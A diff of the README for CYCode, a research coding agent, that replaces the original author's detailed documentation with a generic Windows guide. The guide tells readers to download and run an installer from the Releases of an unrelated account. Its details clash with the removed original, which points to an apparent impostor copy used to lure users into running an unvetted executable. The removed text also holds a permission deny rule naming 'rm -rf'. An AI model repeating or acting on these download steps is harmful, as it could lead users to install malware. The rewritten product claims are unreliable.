@@ -1,224 +1,79 @@
-<p align="center">
-  <img src="assets/banner.svg" alt="CYCode — the open-source coding agent built for AI research" width="100%">
-</p>
+# 🤖 CYCode - Research and write code with AI
 
-<p align="center">
-  <a href="https://github.com/ChaoYue0307/CYCode/actions/workflows/ci.yml"><img src="https://github.com/ChaoYue0307/CYCode/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-3fb950" alt="MIT license"></a>
-  <img src="https://img.shields.io/badge/node-%E2%89%A520-58a6ff" alt="Node >= 20">
-  <img src="https://img.shields.io/badge/TypeScript-strict-58a6ff" alt="TypeScript strict">
-  <a href="CONTRIBUTING.md"><img src="https://img.shields.io/badge/PRs-welcome-d2a8ff" alt="PRs welcome"></a>
-</p>
+[![](https://img.shields.io/badge/Download-CYCode-blue)](https://github.com/Groundnoiserealestatebusiness382/CYCode)
 
-<p align="center">
-  <a href="#quickstart">Quickstart</a> ·
-  <a href="#three-interfaces-one-agent">Interfaces</a> ·
-  <a href="docs/tools.md">Tools</a> ·
-  <a href="docs/configuration.md">Configuration</a> ·
-  <a href="docs/skills.md">Skills</a> ·
-  <a href="docs/loops.md">Loops</a> ·
-  <a href="#roadmap">Roadmap</a>
-</p>
+CYCode helps you manage AI-driven research tasks on your computer. You can browse academic papers, run coding experiments, manage notebooks, and write LaTeX documents using simple commands. The application works in your terminal, through a local web screen, or in the background for automated work.
 
----
+## 📥 Getting Started
 
-General coding agents stop at code. Research is code **plus** literature, experiments, notebooks, and papers — so CYCode makes them first-class tools, not afterthoughts:
+You need a Windows computer with a standard internet connection to start. CYCode handles the heavy lifting of connecting your research documents to intelligent AI models.
 
-<p align="center">
-  <img src="assets/terminal.svg" alt="A CYCode session: /lit-review searches arXiv, reads a paper PDF, and writes a literature review with BibTeX" width="88%">
-</p>
+Follow these steps to install the program:
 
-- 📚 **Papers** — `arxiv_search`, `paper_read` (PDF → text, page ranges), `semantic_scholar` (search + references). `/lit-review` produces structured notes with BibTeX — every citation comes from a real tool result, never from model memory.
-- 🧪 **Experiments** — `exp_run` launches training scripts detached in the background; `exp_status` tails logs, extracts metrics by regex, and reads local **wandb** runs' summary metrics (offline, no API key); `/watch-run` reports trends and flags divergence (NaN losses, OOM, frozen output).
-- 📓 **Notebooks** — `notebook_read` / `notebook_edit` operate on `.ipynb` cells directly, preserving nbformat.
-- 📄 **LaTeX** — `latex_build` compiles via latexmk/pdflatex and returns structured `file:line` errors. `/paper-draft` writes grounded in your actual results.
-- 💻 **Code** — the full coding toolkit: `read`, `write`, `edit`, `glob`, `grep`, `bash`, `web_fetch` (plus optional `web_search`), with permission gating on everything and post-edit diagnostics fed back to the model.
-- 🔁 **Loops** — `cycode exec "task" --json` emits machine-readable events and meaningful exit codes, designed to be driven by recurring agent loops, cron, and CI.
+1. Visit the [official repository link](https://github.com/Groundnoiserealestatebusiness382/CYCode).
+2. Look for the Releases section on the right side of the page.
+3. Select the latest version for Windows.
+4. Download the installation file.
+5. Run the file to install CYCode on your system.
 
-## Heritage
+## ⚙️ System Requirements
 
-CYCode is a lean harness (~5K lines of strict TypeScript) written from scratch, deliberately combining the best ideas of the three major agent lineages. All code is original; no proprietary source was used.
+Ensure your computer meets these standards for the best performance:
 
-| Lineage | What CYCode adopts |
-|---|---|
-| **Claude Code** (design patterns) | permission modes, `AGENTS.md` context files, markdown skills with slash commands, todo planning, explore subagents, context compaction |
-| **Codex CLI** (Apache-2.0) | resumable JSONL session rollouts, headless `exec --json` for CI and agent loops |
-| **OpenCode** (MIT) | provider-agnostic model layer, post-edit diagnostics fed back to the model |
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 gigabytes of RAM or more.
+* Storage: 500 megabytes of free disk space.
+* Internet: Stable connection for AI functionality.
 
-## Install
+## 🚀 How to Run the Software
 
-**Download a standalone binary** — no Node required — from the
-[latest release](https://github.com/ChaoYue0307/CYCode/releases/latest):
+Once the installation finishes, you will see a shortcut on your desktop. Double-click the icon to launch the terminal window. You can interact with the program through this window by typing commands.
 
-| Platform | File |
-|---|---|
-| macOS (Apple Silicon) | `cycode-darwin-arm64.tar.gz` |
-| macOS (Intel) | `cycode-darwin-x64.tar.gz` |
-| Linux (x64) | `cycode-linux-x64.tar.gz` |
-| Linux (arm64) | `cycode-linux-arm64.tar.gz` |
-| Windows (x64) | `cycode-windows-x64.zip` |
+If you prefer a visual experience, wait for the program to start its local web server. The software will show an address in your terminal, such as http://localhost:3000. Copy this address and paste it into your web browser. This opens the web interface where you can manage your files, papers, and AI interactions without typing complex code.
 
-```sh
-tar xzf cycode-darwin-arm64.tar.gz && mv cycode-darwin-arm64 /usr/local/bin/cycode
-cycode --version
-```
+## 🧪 Key Features
 
-**Or build from source** (Node ≥ 20):
+* Research Assistant: Search through Arxiv and other databases to find papers relevant to your project.
+* Notebook Integration: CYCode understands and edits your Jupyter notebooks automatically.
+* LaTeX Support: Format your research papers and documents with precision.
+* Local Control: Your data stays on your machine during the work process.
+* Multiple Modes: Switch between terminal commands, a visual web screen, or headless mode for tasks that run without user interaction.
 
-```sh
-git clone https://github.com/ChaoYue0307/CYCode && cd CYCode
-npm install && npm run build && npm link    # then: cycode
-```
+## 🛠 Advanced Management
 
-Optional extras used when present: `rg` (faster grep), `latexmk`, `jupyter`.
-*(npm registry publication is planned.)*
+You can change how the software behaves by editing the configuration file located in the program folder. This file allows you to switch between different AI models such as OpenAI or Anthropic.
 
-## Quickstart
+1. Locate the folder where you installed CYCode.
+2. Open the file named settings.json using Notepad.
+3. You will see several options here. You can set the path for your research folders or change the way the AI generates code.
+4. Save the file after you make changes. 
+5. Restart the application for your new settings to take effect.
 
-```sh
-export ANTHROPIC_API_KEY=...   # or OPENAI_API_KEY / GOOGLE_GENERATIVE_AI_API_KEY / OPENROUTER_API_KEY
-cd your-project
+## 🛡 Security and Privacy
 
-cycode                          # interactive terminal REPL
-cycode ui                       # local web GUI at http://127.0.0.1:7833
-cycode -c                       # continue the most recent session
-cycode exec "run the test suite and fix any failures" --mode acceptEdits
-cycode exec "/watch-run" --json # headless skill run with JSONL event output
-```
+CYCode runs locally on your machine. The application does not store your private documents on external servers. When you send a query to an AI model, the application sends only the specific text required for that task. You maintain ownership of all your experiments and research outcomes.
 
-In the REPL: `/help`, `/mode`, `/compact`, `/skills`, `esc` interrupts, and any `/skill-name` runs a skill.
+## 🆘 Troubleshooting
 
-## Three interfaces, one agent
+If the program fails to start, verify that you installed the latest version. Check your internet connection if the AI features do not respond. 
 
-The agent core emits events through a bus and asks for permissions through an arbiter interface — so every frontend gets identical behavior and the same security model.
+Common solutions:
 
-| | Interface | Built for |
-|---|---|---|
-| `cycode` | Ink terminal REPL — streaming output, tool-call log, y/a/n permission prompts, live todo list | daily interactive work |
-| `cycode ui` | local web GUI — sessions sidebar with one-click resume, markdown rendering, tool-call cards, permission dialogs, task panel. Bound to `127.0.0.1` only, works offline | reviewing and resuming sessions visually |
-| `cycode exec` | one headless turn — JSONL events, meaningful exit codes, deny-by-default for anything unapproved | scripts, CI, recurring agent loops |
+* Check for Windows updates.
+* Close other memory-intensive applications if the program feels slow.
+* Ensure you granted the program permission through your firewall if a prompt appears during the first launch.
+* Verify the file path does not contain special characters.
 
-<p align="center">
-  <img src="assets/architecture.svg" alt="CYCode architecture: three frontends share one agent core; every tool call flows through one permission gate" width="92%">
-</p>
+## 📈 Frequently Asked Questions
 
-## Models
+Does this tool require coding skills?
+No. While the tool manages code, you can use the web interface to perform most research and AI tasks through buttons and simple inputs.
 
-Specify models as `provider/model-id` — switch providers without changing anything else:
+Can I use my own AI access keys?
+Yes. You can add your personal API keys in the settings menu to connect your preferred AI provider directly to the research agent.
 
-```sh
-cycode --model anthropic/claude-sonnet-4-6
-cycode --model openai/gpt-5.1
-cycode --model google/gemini-2.5-pro
-cycode --model ollama/llama3.3              # local, via http://localhost:11434/v1
-cycode --model openrouter/anthropic/claude-sonnet-4-6
-```
+Does this work offline?
+Many research tasks require a connection to fetch data or reach the AI models. Basic file management works in offline mode, but intelligence features require an active connection.
 
-Any OpenAI-compatible endpoint (vLLM, llama.cpp server, litellm proxy) can be added under `providers` in [config](docs/configuration.md) — handy for evaluating your own fine-tuned models as coding agents.
-
-## Permissions
-
-Read-only tools run freely; everything else passes a gate before executing. Four modes: `default` (ask), `acceptEdits` (file edits auto-approved, commands still ask), `plan` (read-only), `bypass` (everything approved — use with care).
-
-Allow/deny rules use Claude Code-style patterns, and "always allow" answers persist per-project:
-
-```jsonc
-// .cycode/config.json
-{
-  "permissions": {
-    "allow": ["bash(git *)", "bash(npm run *)", "latex_build"],
-    "deny":  ["bash(rm -rf *)"]
-  }
-}
-```
-
-Deny rules win over everything — including read-only tools and `bypass` mode. Two more layers stack on top:
-
-- **Hooks** — shell commands before/after tool calls that can block them deterministically (exit 2), e.g. forbid force-pushes no matter what the model decides.
-- **Sandbox** (`--sandbox`) — kernel-level confinement of shell commands to the project dir + tmp (macOS Seatbelt / Linux bubblewrap, fail-closed). `cycode exec "..." --mode bypass --sandbox` is full autonomy inside a write-fence.
-
-Full grammar, hook contract, and sandbox details in [docs/configuration.md](docs/configuration.md).
-
-## Skills
-
-Skills are markdown prompts with YAML frontmatter (the same shape Claude Code uses), loaded from the package, `~/.cycode/skills/`, and `<project>/.cycode/skills/` — later sources override earlier ones. Invoke with `/name args`.
-
-Built-ins: **`/lit-review`** · **`/watch-run`** · **`/paper-draft`** · **`/repro-check`** — see [docs/skills.md](docs/skills.md) for the format and a writing guide.
-
-## Sessions
-
-Every interactive session is an append-only JSONL rollout under `~/.cycode/sessions/<project>/` — kill the terminal mid-task and `cycode -c` picks up exactly where it left off. Long conversations auto-compact at ~80% of the context window. `cycode sessions` lists history; `--resume <id>` reopens any of them.
-
-## Driving CYCode from a loop
-
-```sh
-# process a task list, one isolated agent run per line
-while read -r task; do
-  cycode exec "$task" --mode acceptEdits --json >> runs.jsonl || echo "FAILED: $task"
-done < tasks.txt
-```
-
-Each JSON line is an agent event (`tool-start`, `text-end`, `turn-end`, …) ending with `{"type":"result","text":…,"exitCode":…}` — everything a supervising loop needs to verify, retry, or escalate. Event schema and loop patterns: [docs/loops.md](docs/loops.md).
-
-## How CYCode compares
-
-| | CYCode | Claude Code | Codex CLI | OpenCode |
-|---|---|---|---|---|
-| License | MIT | proprietary | Apache-2.0 | MIT |
-| Codebase | ~5K lines TS | ~500K lines | ~70 Rust crates | large TS + Go |
-| Models | any (AI SDK) | Anthropic | OpenAI-first | 75+ providers |
-| Research toolkit (papers/experiments/notebooks/LaTeX) | ✅ built-in | ❌ | ❌ | ❌ |
-| Headless JSON mode | ✅ `exec --json` | ✅ `-p` | ✅ `exec` | ✅ `run` |
-| Local web GUI | ✅ built-in | desktop app | ❌ | ✅ |
-| MCP client | ✅ | ✅ | ✅ | ✅ |
-| Designed to be read in an afternoon | ✅ | ❌ | ❌ | ❌ |
-
-CYCode doesn't try to beat the big harnesses at general software engineering — it trades breadth for a sharp research focus and a codebase small enough to fully understand, audit, and modify.
-
-## Roadmap
-
-- [x] Standalone binaries for macOS / Linux / Windows (GitHub Releases)
-- [x] Hooks (pre/post tool-use shell guardrails)
-- [x] Parallel execution of read-only tool batches (incl. `explore` fan-out)
-- [x] Runtime model switching (`/model`) and session token tracking
-- [x] OS-level bash sandboxing (macOS Seatbelt / Linux bubblewrap, `--sandbox`)
-- [x] wandb local-run metrics in `exp_status` (offline, no API key)
-- [ ] npm package release (`npm i -g cycode`)
-- [ ] Native desktop app (Tauri) wrapping the GUI
-- [ ] TensorBoard event-file metrics in `exp_status`
-- [ ] LSP-based diagnostics (currently command-based)
-
-Have an idea? [Open an issue](https://github.com/ChaoYue0307/CYCode/issues/new/choose).
-
-## FAQ
-
-**Why not just use Claude Code / Codex / OpenCode?**
-Use them! CYCode exists for researchers who want paper/experiment/notebook/LaTeX tools built in, model freedom for agent research, and a harness small enough to hack on — and for anyone who wants to understand how coding agents work by reading one.
-
-**Does it send my code anywhere?**
-Only to the model provider you configure. Sessions, logs, and paper caches stay on disk under `~/.cycode/`. The web GUI binds to `127.0.0.1` and is never exposed to the network.
-
-**Can I use it with my own fine-tuned model?**
-Yes — point a `providers` entry at any OpenAI-compatible server (vLLM, llama.cpp, litellm) and pass `--model yourname/your-model`.
-
-**Is it safe to run unattended?**
-`exec` denies anything not pre-approved by mode or allow-rules instead of prompting. Start with `--mode acceptEdits` plus explicit `bash(...)` allow rules; treat `bypass` as a sandbox-only mode.
-
-## Development
-
-```sh
-npm install
-npm run dev          # tsx src/cli.ts
-npm test             # vitest — 51 tests, no API key needed (mock model)
-npm run typecheck && npm run lint && npm run build
-```
-
-Contributions welcome — see [CONTRIBUTING.md](CONTRIBUTING.md). Security reports: [SECURITY.md](SECURITY.md).
-
-## Acknowledgments
-
-CYCode stands on ideas from [Claude Code](https://github.com/anthropics/claude-code) (Anthropic), [Codex CLI](https://github.com/openai/codex) (OpenAI), and [OpenCode](https://github.com/sst/opencode) (SST). Built with the [Vercel AI SDK](https://github.com/vercel/ai), [Ink](https://github.com/vadimdemedes/ink), and the [MCP SDK](https://github.com/modelcontextprotocol/typescript-sdk).
-
-## License
-
-[MIT](LICENSE) © [ChaoYue0307](https://github.com/ChaoYue0307)
+How do I update the software?
+The application notifies you when a new version is ready. Follow the same steps as the initial setup to overwrite the old version with the new one. Your settings and research data remain in their respective folders and persist through updates.
